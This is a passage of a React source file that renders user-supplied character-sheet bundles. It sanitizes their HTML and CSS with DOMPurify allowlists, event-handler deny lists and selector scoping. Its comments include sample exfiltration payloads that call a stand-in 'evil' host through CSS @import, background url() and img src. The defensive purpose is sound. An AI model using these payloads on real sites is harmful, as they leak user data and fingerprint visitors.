//   - 'style'                              — parseCssString in buildProps splits
//                                            it into an object; CSS-level sanit-
//                                            isation is hardening #3.
//
// FORCE_BODY:true keeps bundle HTML fragments intact (no <html>/<head>/<body>
// rearrangement). KEEP_CONTENT:true preserves the children of any stripped
// element so a malicious <script> wrapper doesn't take the real content with it.
const ALLOWED_BUNDLE_TAGS = [
  // Structure
  'div','span','p','section','article','aside','nav','header','footer','main',
  // Headings
  'h1','h2','h3','h4','h5','h6',
  // Inline text
  'a','b','i','em','strong','u','s','small','code','pre','kbd','samp','var','mark',
  'sub','sup','time','abbr','cite','q','blockquote','figure','figcaption',
  // Lists
  'ul','ol','li','dl','dt','dd',
  // Tables
  'table','thead','tbody','tfoot','tr','th','td','caption','colgroup','col',
  // Forms (engine reads bindings off these — see TAG_SPECIFIC_HTML_ATTRS)
  'form','fieldset','legend','label','input','textarea','select','option','optgroup','button',
  // Media (currently unused by shipped bundles but in TAG_SPECIFIC_HTML_ATTRS)
  'img','video','audio','source','track',
  // Misc
  'br','hr','details','summary',
];

// Union of every per-tag set, plus the globals. DOMPurify uppercases internally
// but accepts lowercase in config — keep them lowercase to match our other lists.
const ALLOWED_BUNDLE_ATTRS = (() => {
  const all = new Set(GLOBAL_HTML_ATTRS);
  for (const tagSet of Object.values(TAG_SPECIFIC_HTML_ATTRS)) {
    for (const attr of tagSet) all.add(attr);
  }
  return Array.from(all);
})();

// Built once at module load — DOMPurify accepts a fresh config per sanitize()
// call, but constructing it once is cheaper. The config object itself is not
// shared across sanitize() calls thanks to the spread; this avoids the
// "leaky config" class of issues DOMPurify has had historically.
const DOMPURIFY_CONFIG = Object.freeze({
  ALLOWED_TAGS:   ALLOWED_BUNDLE_TAGS,
  ALLOWED_ATTR:   ALLOWED_BUNDLE_ATTRS,
  ALLOW_DATA_ATTR: true,    // engine attrs are data-*; buildProps filters which
  ALLOW_ARIA_ATTR: true,
  FORCE_BODY:     true,
  KEEP_CONTENT:   true,
  // Explicitly forbid script + dangerous embeds even if they accidentally
  // end up on a tag allowlist somehow — DOMPurify removes these regardless
  // of ALLOWED_TAGS, but listing them documents intent.
  FORBID_TAGS:    ['script','style','iframe','object','embed','link','meta','base'],
  // No event handlers, ever. Same intent as the "name.startsWith('on')" drop
  // in buildProps — two walls.
  FORBID_ATTR:    ['onerror','onload','onclick','onmouseover','onfocus','onblur',
                   'onchange','onsubmit','oninput','onanimationstart','onanimationend',
                   'ontransitionend','onauxclick','onpointerdown','onpointerup',
                   'formaction','autofocus'],
});

// Sanitize a bundle's sheet.html before parsing.
// Pass through DOMPurify with a fresh spread of the config (defence against
// any future hook-pollution / setConfig leakage). The result is a clean HTML
// string suitable for DOMParser.
function sanitizeBundleHtml(html) {
  return DOMPurify.sanitize(html, { ...DOMPURIFY_CONFIG });
}

// ── DOMPurify equivalent for CSS: theme.css sanitization ──────────────────
// Bundle hardening #3. theme.css is supplied by the bundle author and injected
// verbatim into a <style> tag in document.head. Three attacker surfaces:
//
//   1. @import url(https://evil/exfil?...): the browser fetches that URL on
//      every load, leaking IP + timestamp. Bundles never legitimately need
//      @import — they're self-contained.
//   2. Selectors that escape .sheet-root: a rule like
//        .login-button { display: none }   or
//        input[type="password"] { background: url('https://evil/log?focused') }
//      restyles app chrome or fingerprints stored data via background-url
//      fetches that fire on selector match.
//   3. url() with javascript: or data: schemes — modern browsers reject these,
//      but old WebKit can be inconsistent.
//
// We do two passes:
//
//   PASS 1 (text-level): regex-strip @import and @charset before they reach
//     the parser. Belt-and-suspenders since pass 2 would also drop them, but
//     pass 2 is async-safe-only and we want zero chance of an @import url()
//     firing a fetch during parsing.
//
//   PASS 2 (CSSOM): create a CSSStyleSheet, replaceSync() the cleaned text,
//     then walk cssRules. For each style rule, prefix any selector that
//     isn't already scoped under .sheet-root. Drop @import/@charset
//     defensively. Recurse into @media/@supports for nested rules.
//
// Fail-closed: if anything throws, return an empty string (no theme applied)
// rather than the un-sanitized original. A broken sheet is recoverable; a
// bypassed sanitizer isn't.
function sanitizeBundleCss(rawCss) {
  if (!rawCss || typeof rawCss !== 'string') return '';
  try {
    // Pass 1: strip @import and @charset at the text level. Match common
    // forms — quoted/unquoted URLs, optional media query lists.
    const text = rawCss
      .replace(/@import\s+[^;]+;/gi, '')
      .replace(/@charset\s+["'][^"']*["']\s*;/gi, '');

    // Pass 2: parse via CSSOM and prefix selectors.
    // CSSStyleSheet + replaceSync is supported in all modern browsers (Chrome
    // 73+, Firefox 101+, Safari 16.4+). All currently in our browserslist.
    const sheet = new CSSStyleSheet();
    sheet.replaceSync(text);

    const out = [];
    for (let i = 0; i < sheet.cssRules.length; i++) {
      const rule = sheet.cssRules[i];
      const cleaned = cleanCssRule(rule);
      if (cleaned) out.push(cleaned);
    }
    return out.join('\n');
  } catch (e) {
    // eslint-disable-next-line no-console
    console.warn('[SheetRenderer] theme.css failed sanitization — dropping theme', e);
    return '';
  }
}

// Walk one CSSRule and return its sanitized cssText, or '' to drop it.
// Recurses into grouping rules (@media, @supports) which contain their own
// cssRules collection.
function cleanCssRule(rule) {
  // CSSRule.type is deprecated but still the most portable way to discriminate.
  // 1 = STYLE_RULE, 3 = IMPORT_RULE, 2 = CHARSET_RULE, 4 = MEDIA_RULE,
  // 12 = SUPPORTS_RULE. Others (keyframes, font-face, page) we pass through.
  switch (rule.type) {
    case 3:  // IMPORT — already stripped in pass 1, defence in depth.
    case 2:  // CHARSET — same.
      return '';

    case 1: {  // STYLE_RULE
      // selectorText is a comma-separated list. Prefix each selector that
      // doesn't already start under .sheet-root. This forces the rule to
      // only match inside the sheet, no matter what the author wrote.
      const selectors = rule.selectorText.split(',').map(s => prefixSelector(s.trim()));
      // Rebuild cssText: "selector1, selector2 { decls }" — use rule.style.cssText
      // for the declarations to keep browser-canonical formatting and drop any
      // unparseable noise.
      return `${selectors.join(', ')} { ${rule.style.cssText} }`;
    }

    case 4:    // MEDIA_RULE
    case 12: { // SUPPORTS_RULE
      // Grouping rules contain nested rules — recurse.
      const inner = [];
      for (let j = 0; j < rule.cssRules.length; j++) {
        const c = cleanCssRule(rule.cssRules[j]);
        if (c) inner.push(c);
      }
      if (!inner.length) return '';
      // rule.conditionText gives the "(max-width: 600px)" part for both
      // @media and @supports in modern browsers.
      const at = rule.type === 4 ? '@media' : '@supports';
      const cond = rule.conditionText || rule.media?.mediaText || '';
      return `${at} ${cond} { ${inner.join(' ')} }`;
    }

    default:
      // @keyframes, @font-face, @page, @namespace — no selectors targeting
      // app chrome, so pass through as-is. Use cssText (the browser's
      // serialised form).
      return rule.cssText || '';
  }
}

// Prefix a single selector so it only matches inside .sheet-root.
// Already-scoped selectors are returned unchanged.
function prefixSelector(sel) {
  const trimmed = sel.trim();
  if (!trimmed) return '';
  // Already scoped (starts with .sheet-root, or is exactly .sheet-root).
  if (trimmed === '.sheet-root' || /^\.sheet-root[\s>+~,]|^\.sheet-root$/.test(trimmed)) {
    return trimmed;
  }
  // :root → .sheet-root (so CSS variables declared at :root only apply inside
  // the sheet, not globally on the app).
  if (/^:root\b/.test(trimmed)) {
    return trimmed.replace(/^:root\b/, '.sheet-root');
  }
  // Everything else: descendant of .sheet-root.
  // "body" → ".sheet-root body" (which won't match anything — good, that's
  // the intent: a bundle can't restyle <body>).
  return `.sheet-root ${trimmed}`;
}

// ── buildProps ──────────────────────────────────────────────────────────────
// Translate a node's raw attribute bag into React props for the chosen tag.
//
//   tag       lowercase tag name. Drives the per-tag allowlist.
//   attrs    {name: value} from getAttrs(node). Strings only.
//   key      React key for the resulting element.
//   stripList Additional names to drop unconditionally (defence-in-depth: used
//             when the callsite has already consumed an attr — e.g. <a> falling
//             back to <span> wants 'href' gone even though it's allowlisted).
//   extra    Props the callsite controls and forwards as-is (value/onChange/
//             disabled/etc). Wins over anything coming from attrs.
function buildProps(tag, attrs, key, stripList = [], extra = {}) {
  const props = { key };
  const stripSet = new Set(stripList);
  const tagAllow = TAG_SPECIFIC_HTML_ATTRS[tag] || null;
  const dropped = __isDev ? [] : null;

  for (const [rawName, value] of Object.entries(attrs)) {
    if (stripSet.has(rawName)) continue;
    const name = rawName.toLowerCase();

    // 1. Event handlers (on*) — dropped unconditionally. This is the core fix.
    //    onMouseOver, onError, onLoad, onAnimationStart, formaction-as-handler,
    //    all of them. Never legitimate in static bundle HTML.
    if (name.startsWith('on')) { if (dropped) dropped.push(rawName); continue; }

    // 2. data-* — only ENGINE_ATTRS allowed. Custom data-* dropped.
    //    Rationale: a bundle could otherwise inject data-* the app doesn't
    //    own and confuse downstream code (or be the target of a future CSS
    //    selector that styles app chrome based on bundle-controlled data).
    if (name.startsWith('data-')) {
      // Engine reads ENGINE_ATTRS through dedicated branches before buildProps
      // is even called, so they don't need to land on the React element — but
      // some (data-ref, data-export-skip, data-collapse-after) are read off
      // the DOM later via getAttribute. Forwarding them keeps that working.
      if (ENGINE_ATTRS.has(name)) { props[name] = value; continue; }
      if (dropped) dropped.push(rawName);
      continue;
    }

    // 3. aria-* — entire family allowed (accessibility, safe).
    if (name.startsWith('aria-')) { props[name] = value; continue; }

    // 4. style — parsed into an object before reaching React. parseCssString
    //    splits on ';' and ':' which neutralises most embedded-script tricks;
    //    a CSS-level sanitizer comes in hardening #3.
    if (name === 'style') { props.style = parseCssString(value); continue; }

    // 5. Renames (class→className, for→htmlFor, tabindex→tabIndex, …).
    //    Only renamed if the source name is on an allowlist for this tag.
    if (GLOBAL_HTML_ATTRS.has(name) || (tagAllow && tagAllow.has(name))) {
      // 5a. URL-bearing attrs (src/srcset/poster/...): if the value points to a
      //     different origin (or to javascript:/data: which isExternalHref also
      //     flags), drop it. This stops a hostile bundle from leaking IPs via
      //     <img src="https://evil/log?...">, exfiltrating data through tracker
      //     URLs, or running embedded data:/javascript: payloads. Bundle assets
      //     are served same-origin under /api/sheets/<id>/assets/, so legitimate
      //     bundle content is never affected.
      if (URL_BEARING_ATTRS.has(name)) {
        // srcset can be a comma-separated list of "url <descriptor>" pairs;
        // be conservative and drop the WHOLE value if any candidate URL is
        // off-origin — partial trust is worse than no trust.
        const candidates = name === 'srcset'
          ? value.split(',').map(s => s.trim().split(/\s+/)[0]).filter(Boolean)
          : [value];
        if (candidates.some(u => isExternalHref(u))) {
          if (dropped) dropped.push(`${rawName} (off-origin)`);
          continue;
        }
      }
      const reactName = REACT_ATTR_RENAMES[name] || name;
      props[reactName] = value;
      continue;
    }

    // 6. Anything else — dropped.
    if (dropped) dropped.push(rawName);
  }

  if (dropped && dropped.length) {
    // eslint-disable-next-line no-console
    console.warn(`[SheetRenderer] dropped ${dropped.length} attr(s) on <${tag}>:`, dropped);
  }

  return { ...props, ...extra };
}

// ── Recursive walker ──────────────────────────────────────────────────────────
function renderNodeFull(node, char, updateRef, schemaRef, charId, readOnly, key = 0) {
  if (node.nodeType === 3) {
    const text = node.textContent;
    return text.trim() ? text : null;
  }
  if (node.nodeType !== 1) return null;

  const tag = node.tagName.toLowerCase();
  if (['script', 'link', 'style', 'head', 'iframe'].includes(tag)) return null;

  const attrs      = getAttrs(node);
  const bindPath   = attrs['data-bind'];
  const dataType   = attrs['data-type'];
  const dataList   = attrs['data-list'];
  const dataAction = attrs['data-action'];
  const dataTarget = attrs['data-target'];
  const dataMax    = attrs['data-max'];

// ── tabs (opt-in: data-tabs container, children with data-tab="Label") ─────
  if (attrs['data-tabs'] !== undefined) {
    const tabKids = Array.from(node.childNodes).filter(
      (n) => n.nodeType === 1 && n.hasAttribute('data-tab')
    );
    const labels = tabKids.map((n) => n.getAttribute('data-tab') || '');
    const panels = tabKids.map((n) =>
      Array.from(n.childNodes)
        .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
        .filter(Boolean)
    );
    const panelClasses = tabKids.map((n) => n.getAttribute('class') || '');
    // Tabs flagged data-export-skip render normally live but are omitted from
    // the export render. Bundle-driven — the renderer doesn't know which tab.
    const skipExport = tabKids.map((n) => n.hasAttribute('data-export-skip'));
    const hostProps = buildProps('div', attrs, key, []);
    return React.createElement(Tabs, { ...hostProps, labels, panels, panelClasses, exportMode: sheetExportMode, skipExport });
  }

  // ── collapsible (opt-in: data-collapsible="Title", data-collapsed=start closed) ──
  if (attrs['data-collapsible'] !== undefined) {
    const title       = attrs['data-collapsible'] || '';
    const defaultOpen = attrs['data-collapsed'] === undefined;
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
      .filter(Boolean);
    const hostProps = buildProps('div', attrs, key,
      ['data-collapsible','data-collapsed','data-bind','data-type','data-list','data-item','data-action','data-target','data-max']);
    return React.createElement(Collapsible, { ...hostProps, title, defaultOpen, exportMode: sheetExportMode }, ...kids);
  }

  // ── markdown edit group (opt-in: data-md-group on a wrapper) ───────────────
  // All data-type="markdown" fields inside share one editing state, driven by
  // a single data-md-toggle button anywhere in the subtree. Used when a card
  // has several markdown fields that should flip together (e.g. a clich&eacute;
  // card's name + tools).
  if (attrs['data-md-group'] !== undefined) {
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
      .filter(Boolean);
    const hostProps = buildProps('div', attrs, key, ['data-md-group']);
    return React.createElement(MarkdownGroup, hostProps, ...kids);
  }

  // The shared toggle button for a markdown group. Renders nothing when not
  // inside a data-md-group, so a stray attribute doesn't drop a dead button.
  if (attrs['data-md-toggle'] !== undefined) {
    const hostProps = buildProps('button', attrs, key, ['data-md-toggle']);
    return React.createElement(MarkdownGroupToggle, hostProps);
  }

  // ── static reference content (data-ref="Key") ──────────────────────────────
  // Renders the element normally and appends a ⓘ that opens the read-only
  // reference text from schema.json's `reference` map. No-op if the key is
  // absent, so bundles can tag elements before the text exists.
  if (attrs['data-ref'] !== undefined) {
    const refKey  = attrs['data-ref'];
    const refText = schemaRef.current?.reference?.[refKey];
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
      .filter(Boolean);
    const props = buildProps(tag, attrs, key, []);
    const info = refText
      ? React.createElement(InfoButton, {
          key: '__info',
          title: attrs['data-title'] || refKey,
          refText,
          text: '',
          editable: false,
        })
      : null;
    return React.createElement(tag, props, ...kids, info);
  }

  // ── external link policy (default: neutralize off-origin <a> to plain text) ──
  if (tag === 'a') {
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
      .filter(Boolean);
    const external = isExternalHref(attrs.href);
    if (external && !allowExternalLinks) {
      const spanProps = buildProps('span', attrs, key,
        ['href','target','rel','data-bind','data-type','data-list','data-item','data-action','data-target','data-max']);
      return React.createElement('span', spanProps, ...kids);
    }
    const linkProps = buildProps('a', attrs, key,
      ['data-bind','data-type','data-list','data-item','data-action','data-target','data-max'],
      external ? { target: '_blank', rel: 'noopener noreferrer' } : {});
    return React.createElement('a', linkProps, ...kids);
  }

  // ── data-list ──────────────────────────────────────────────────────────────
  if (dataList) {
    const items = resolvePath(char, dataList) ?? [];
    const templateNode = Array.from(node.childNodes).find(
      (n) => n.nodeType === 1 && n.hasAttribute('data-item')
    );
    if (!templateNode) return null;

    const itemElements = items.map((item, i) => {
      const itemUpdate = (patch) => {
        if (patch === null || patch?.__remove) {
          updateRef.current(setPath(char, dataList, items.filter((_, idx) => idx !== i)));
        } else {
          const next = [...items];
          next[i] = { ...next[i], ...patch };
          updateRef.current(setPath(char, dataList, next));
        }
      };
      return renderListItem(templateNode, item, itemUpdate, schemaRef, charId, i);
    }).filter(Boolean);

    const containerProps = buildProps(tag, attrs, key, ['data-list','data-item','data-action','data-target','data-bind','data-type','data-max']);
    return wrapIfTable(tag, React.createElement(tag, containerProps, ...itemElements), key);
  }

  // ── data-action="add" ──────────────────────────────────────────────────────
  // Opens the schema-defined add form when addForms.<target> exists, otherwise
  // appends an empty item (original behavior). data-insert="prepend" inserts
  // new items at the top of the list.
  if (dataAction === 'add' && dataTarget) {
    if (sheetReadOnly) return null;
    const { key: _hostKey, ...hostProps } = buildProps('button', attrs, key, ['data-action','data-target','data-insert','data-form-title']);
    return React.createElement(AddItemButton, {
      key,
      label: node.textContent,
      target: dataTarget,
      prepend: attrs['data-insert'] === 'prepend',
      formTitle: attrs['data-form-title'],
      char, updateRef, schemaRef,
      hostProps,
    });
  }

  // ── portrait ───────────────────────────────────────────────────────────────
  if (dataType === 'portrait') {
    const portraitUrl = char.portrait || null;
    const onUpload = (url) => updateRef.current(setPath(char, 'portrait', url));
    return React.createElement(Portrait, { key, charId, portraitUrl, onUpload, readOnly });
  }

  // readonly-name — displays the character name, not editable here
  if (dataType === 'readonly-name') {
    const value = resolvePath(char, bindPath) || '';
    return React.createElement('span', {
      key,
      style: {
        fontFamily: 'var(--font-header, var(--font-display))',
        fontSize: '18px',
        fontWeight: '700',
        color: 'var(--ink, var(--text-primary))',
        letterSpacing: '0.04em',
        display: 'block',
        padding: '2px 0',
        borderBottom: '1px solid var(--parch-shadow, var(--border))',
        minHeight: '26px',
      }
    }, value || ' '); // nbsp so the line doesn't collapse when empty
  }

  // ── autofit input (data-type="autofit") ────────────────────────────────────
  // A normal controlled data-bind input whose font shrinks to fit its box.
  // Reuses the standard value/onChange wiring and respects read-only.
  if (dataType === 'autofit' && bindPath) {
    const value    = resolvePath(char, bindPath) ?? '';
    const onChange = (e) => {
      const val = e.target.type === 'number' ? (parseFloat(e.target.value) || 0) : e.target.value;
      updateRef.current(setPath(char, bindPath, val));
    };
    const inputProps = buildProps('input', attrs, key, ['data-bind', 'data-type'], { value, onChange, disabled: sheetReadOnly });
    return React.createElement(AutofitInput, {
      ...inputProps,
      maxFont: parseFloat(attrs['data-max-font']) || 18,
      minFont: parseFloat(attrs['data-min-font']) || 10,
    });
  }

  // ── data-type widgets ──────────────────────────────────────────────────────
  if (dataType && bindPath) {
    const value    = resolvePath(char, bindPath);
    const onChange = sheetReadOnly ? () => {} : (val) => updateRef.current(setPath(char, bindPath, val));

    if (dataType === 'die')        return React.createElement(DieSelector, { key, value: value ?? { die: 'd4', bonus: 0 }, onChange });
    if (dataType === 'tracker') {
      // Max comes from either a bound character field (data-max-bind="path")
      // or the data-max literal. The bound form lets the player configure pool
      // sizes per character; the literal stays the simple default.
      const maxBind = attrs['data-max-bind'];
      const boundMax = maxBind ? Number(resolvePath(char, maxBind)) : NaN;
      const max = Number.isFinite(boundMax) && boundMax > 0
        ? boundMax
        : (dataMax !== undefined ? Number(dataMax) : 3);
      return React.createElement(Tracker, { key, value: value ?? 0, max, onChange });
    }
    if (dataType === 'toggle')     return React.createElement(Toggle,      { key, value: !!value, onChange });
    if (dataType === 'xp-tracker') return React.createElement(XPTracker,   { key, value: value ?? 0, max: dataMax ?? 30, onChange });
    if (dataType === 'stepper')    return React.createElement(Stepper, {
      key, value: value ?? 0, onChange, disabled: sheetReadOnly,
      min: attrs['data-min'] !== undefined ? Number(attrs['data-min']) : undefined,
      max: dataMax !== undefined ? Number(dataMax) : undefined,
    });
    if (dataType === 'markdown') {
      // Export always renders read-only formatted text — same shape as the
      // existing textarea branch below — so the markdown widget collapses to
      // the formatted view in print/PDF flows.
      if (sheetExportMode) {
        return React.createElement('div', { key, className: 'cf-export-text' }, renderMarkdown(value) ?? '');
      }
      const mdOnChange = sheetReadOnly ? () => {} : (e) => updateRef.current(setPath(char, bindPath, e.target.value));
      const inputProps = buildProps(tag, attrs, key, ['data-bind','data-type'], {
        value: value ?? '',
        onChange: mdOnChange,
        disabled: sheetReadOnly,
      });
      return React.createElement(MarkdownField, inputProps);
    }
  }

  // ── data-bind → controlled input ──────────────────────────────────────────
  if (bindPath && !dataType) {
    const value    = resolvePath(char, bindPath) ?? '';
    const onChange = (e) => {
      const val = e.target.type === 'number' ? (parseFloat(e.target.value) || 0) : e.target.value;
      updateRef.current(setPath(char, bindPath, val));
    };
    if (sheetExportMode && tag === 'textarea') {
      return React.createElement('div', { key, className: 'cf-export-text' }, renderMarkdown(value) ?? '');
    }
    if (['input', 'select', 'textarea'].includes(tag)) {
      const inputProps = buildProps(tag, attrs, key, ['data-bind','data-type'], { value, onChange, disabled: sheetReadOnly });
      if (tag === 'select') {
        const options = Array.from(node.childNodes)
          .filter((n) => n.nodeType === 1 && n.tagName?.toLowerCase() === 'option')
          .map((n, oi) => React.createElement('option', { key: oi, value: n.getAttribute('value') ?? n.textContent }, n.textContent));
        return React.createElement('select', inputProps, ...options);
      }
      return React.createElement(tag, inputProps);
    }
  }

  // ── recurse ────────────────────────────────────────────────────────────────
  const children = Array.from(node.childNodes)
    .map((child, i) => renderNodeFull(child, char, updateRef, schemaRef, charId, readOnly, i))
    .filter(Boolean);

  const props = buildProps(tag, attrs, key, ['data-bind','data-type','data-list','data-item','data-action','data-target','data-max']);
  if (['br','hr'].includes(tag)) return React.createElement(tag, props);
  return wrapIfTable(tag, React.createElement(tag, props, ...children), key);
}

function renderListItem(templateNode, item, itemUpdate, schemaRef, charId, key) {
  const tag   = templateNode.tagName.toLowerCase();
  const attrs = getAttrs(templateNode);
  const collapseAfter = attrs['data-collapse-after'] !== undefined
    ? parseInt(attrs['data-collapse-after'], 10)
    : undefined;
  const children = Array.from(templateNode.childNodes)
    .map((child, i) => renderItemChildFull(child, item, itemUpdate, schemaRef, charId, i, key, collapseAfter))
    .filter(Boolean);
  const props = buildProps(tag, attrs, key, ['data-item','data-list','data-bind','data-type','data-action','data-target','data-max','data-collapse-after']);
  return React.createElement(tag, props, ...children);
}

function renderItemChildFull(node, item, itemUpdate, schemaRef, charId, key, itemIndex, collapseAfter) {
  if (node.nodeType === 3) {
    const text = node.textContent;
    return text.trim() ? text : null;
  }
  if (node.nodeType !== 1) return null;

  const tag  = node.tagName.toLowerCase();
  if (['script','style','link','iframe'].includes(tag)) return null;

  const attrs      = getAttrs(node);
  const bindPath   = attrs['data-bind'];
  const dataType   = attrs['data-type'];
  const dataAction = attrs['data-action'];
  const dataMax    = attrs['data-max'];

  // ── collapsible inside a list item ─────────────────────────────────────────
  // data-collapsible="Session" data-collapsible-bind="date" → "Session — <date>"
  if (attrs['data-collapsible'] !== undefined) {
    const baseTitle = attrs['data-collapsible'] || '';
    const bindKey   = attrs['data-collapsible-bind'];
    const bindVal   = bindKey ? (item[bindKey] || '') : '';
    const title     = bindVal ? (baseTitle ? `${baseTitle} — ${bindVal}` : bindVal) : baseTitle;
    let defaultOpen;
    if (attrs['data-collapsed'] !== undefined) {
      defaultOpen = false;
    } else if (collapseAfter !== undefined) {
      defaultOpen = itemIndex <= collapseAfter;
    } else {
      defaultOpen = true;
    }
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderItemChildFull(child, item, itemUpdate, schemaRef, charId, i, itemIndex, collapseAfter))
      .filter(Boolean);
    const hostProps = buildProps('div', attrs, key,
      ['data-collapsible','data-collapsed','data-bind','data-type','data-list','data-item','data-action','data-target','data-max']);
    return React.createElement(Collapsible, { ...hostProps, title, defaultOpen, exportMode: sheetExportMode}, ...kids);
  }

  // ── markdown group inside a list item (e.g. a clich&eacute; card's name+tools) ──
  if (attrs['data-md-group'] !== undefined) {
    const kids = Array.from(node.childNodes)
      .map((child, i) => renderItemChildFull(child, item, itemUpdate, schemaRef, charId, i, itemIndex, collapseAfter))
      .filter(Boolean);
    const hostProps = buildProps('div', attrs, key, ['data-md-group']);
    return React.createElement(MarkdownGroup, hostProps, ...kids);
  }
  if (attrs['data-md-toggle'] !== undefined) {
    const hostProps = buildProps('button', attrs, key, ['data-md-toggle']);
    return React.createElement(MarkdownGroupToggle, hostProps);
  }

  // ── per-item info popover (data-action="info") ─────────────────────────────
  // data-bind names the item field holding the player's text (default:
  // "description"). data-ref-key names the item field whose VALUE keys into
  // schema.json's `reference` map — e.g. data-ref-key="name" on a skill row
  // pulls the bundle's rules text for "Athletics" into the same popover.
  if (dataAction === 'info') {
    const field    = bindPath || 'description';
    const refKeyF  = attrs['data-ref-key'];
    const refMap   = schemaRef.current?.reference;
    const refText  = refKeyF ? refMap?.[item[refKeyF]] : undefined;
    const title    = attrs['data-title'] || (refKeyF ? item[refKeyF] : item.name) || '';
    return React.createElement(InfoButton, {
      key,
      title,
      refText,
      text: item[field] ?? '',
      editable: !sheetReadOnly,
      onChange: (v) => itemUpdate({ [field]: v }),
    });
  }

  if (dataAction === 'remove') {
    if (sheetReadOnly) return null;
    const props = buildProps('button', attrs, key, ['data-action'], {
      onClick: () => itemUpdate(null),
      type: 'button',
    });
    return React.createElement('button', props, node.textContent);
  }

  if (dataType && bindPath) {
    const value    = item[bindPath];
    const onChange = sheetReadOnly ? () => {} : (val) => itemUpdate({ [bindPath]: val });

    if (dataType === 'die')        return React.createElement(DieSelector, { key, value: value ?? { die: 'd4', bonus: 0 }, onChange });
    if (dataType === 'tracker') {
      const maxBind = attrs['data-max-bind'];
      const boundMax = maxBind ? Number(item?.[maxBind]) : NaN;
      const max = Number.isFinite(boundMax) && boundMax > 0
        ? boundMax
        : (dataMax !== undefined ? Number(dataMax) : 3);
      return React.createElement(Tracker, { key, value: value ?? 0, max, onChange });
    }
    if (dataType === 'rank-badge') return React.createElement(RankBadge,   { key, value });
    if (dataType === 'attr-badge') return React.createElement('span',      { key, className: 'attr-badge' }, value ?? '');
    if (dataType === 'stepper')    return React.createElement(Stepper, {
      key, value: value ?? 0, onChange, disabled: sheetReadOnly,
      min: attrs['data-min'] !== undefined ? Number(attrs['data-min']) : undefined,
      max: dataMax !== undefined ? Number(dataMax) : undefined,
    });
    if (dataType === 'markdown') {
      if (sheetExportMode) {
        return React.createElement('div', { key, className: 'cf-export-text' }, renderMarkdown(value) ?? '');
      }
      const mdOnChange = sheetReadOnly ? () => {} : (e) => itemUpdate({ [bindPath]: e.target.value });
      const inputProps = buildProps(tag, attrs, key, ['data-bind','data-type'], {
        value: value ?? '',
        onChange: mdOnChange,
        disabled: sheetReadOnly,
      });
      return React.createElement(MarkdownField, inputProps);
    }
  }

  if (bindPath && !dataType) {
    const value    = item[bindPath] ?? '';
    const onChange = (e) => {
      const val = e.target.type === 'number' ? (parseFloat(e.target.value) || 0) : e.target.value;
      itemUpdate({ [bindPath]: val });
    };
    if (sheetExportMode && tag === 'textarea') {
      return React.createElement('div', { key, className: 'cf-export-text' }, renderMarkdown(value) ?? '');
    }
    if (['input','select','textarea'].includes(tag)) {
      const inputProps = buildProps(tag, attrs, key, ['data-bind','data-type'], { value, onChange, disabled: sheetReadOnly });
      if (tag === 'select') {
        const options = Array.from(node.childNodes)
          .filter((n) => n.nodeType === 1 && n.tagName?.toLowerCase() === 'option')
          .map((n, oi) => React.createElement('option', { key: oi, value: n.getAttribute('value') ?? n.textContent }, n.textContent));
        return React.createElement('select', inputProps, ...options);
      }
      return React.createElement(tag, inputProps);
    }
  }

  const children = Array.from(node.childNodes)
    .map((child, i) => renderItemChildFull(child, item, itemUpdate, schemaRef, charId, i))
    .filter(Boolean);

  const props = buildProps(tag, attrs, key, ['data-bind','data-type','data-list','data-item','data-action','data-target','data-max']);
  if (['br','hr'].includes(tag)) return React.createElement(tag, props);
  return wrapIfTable(tag, React.createElement(tag, props, ...children), key);
}

// ════════════════════════════════════════════════════════════════════════════
// SheetRenderer — exported component
// ════════════════════════════════════════════════════════════════════════════
export default function SheetRenderer({ char, update, charId, readOnly = false, exportMode = false }) {
  const [htmlString, setHtmlString] = useState(null);
  const [error,      setError]      = useState(null);
  const [allowLinks, setAllowLinks] = useState(false);
  const styleRef  = useRef(null);
  const updateRef = useRef(update);
  const schemaRef = useRef(null);  // holds parsed schema.json — no re-render on change

  useEffect(() => { updateRef.current = update; }, [update]);

  // Read the app-wide external-link policy (public endpoint, works on share pages).
  useEffect(() => {
    api.getSettings().then(s => setAllowLinks(!!s?.allowExternalLinks)).catch(() => {});
  }, []);

  // Mirror onto the module variable before renderNodeFull runs this render.
  allowExternalLinks = allowLinks;
  sheetReadOnly   = readOnly || exportMode;   // export is inherently read-only
  sheetExportMode = exportMode;

  const sheetId = char?.sheetId;

  // ── Fetch sheet.html, theme.css, schema.json once per sheetId ─────────────
  useEffect(() => {
    if (!sheetId) return;
    setHtmlString(null);
    setError(null);

    Promise.all([
      fetch(`/api/sheets/${sheetId}/sheet.html`, { credentials: 'include' }).then((r) => {
        if (!r.ok) throw new Error(`sheet.html not found (${r.status})`);
        return r.text();
      }),
      fetch(`/api/sheets/${sheetId}/theme.css`, { credentials: 'include' }).then((r) => {
        if (!r.ok) throw new Error(`theme.css not found (${r.status})`);
        return r.text();
      }),
      fetch(`/api/sheets/${sheetId}/schema`, { credentials: 'include' }).then((r) => {
        if (!r.ok) throw new Error(`schema not found (${r.status})`);
        return r.json();
      }),
    ])
      .then(([html, css, schema]) => {
        // Resolve the bundle asset base so authors can write %ASSETS%/logo.png
        // (or url('%ASSETS%/bg.jpg') in theme.css) instead of the full path.
        // Absolute /api/sheets/<id>/assets/... paths still work too.
        const assetBase = `/api/sheets/${sheetId}/assets`;

        // Sanitize and inject CSS. sanitizeBundleCss strips @import / @charset
        // (closes the off-origin exfiltration vector) and prefixes every
        // selector with .sheet-root so a bundle's theme can't restyle the app's
        // own chrome (login, admin, share UI). %ASSETS% resolution happens
        // BEFORE sanitization so url() values see the final paths.
        if (styleRef.current) styleRef.current.remove();
        const style = document.createElement('style');
        style.setAttribute('data-sheet-theme', sheetId);
        style.textContent = sanitizeBundleCss(css.split('%ASSETS%').join(assetBase));
        document.head.appendChild(style);
        styleRef.current = style;

        schemaRef.current = schema;
        // Sanitize bundle HTML through DOMPurify BEFORE parsing & rendering.
        // We do this once at fetch time (not on every render) — the result is
        // a static string that DOMParser will then walk normally. %ASSETS% has
        // already been resolved so DOMPurify sees the final URLs (relevant for
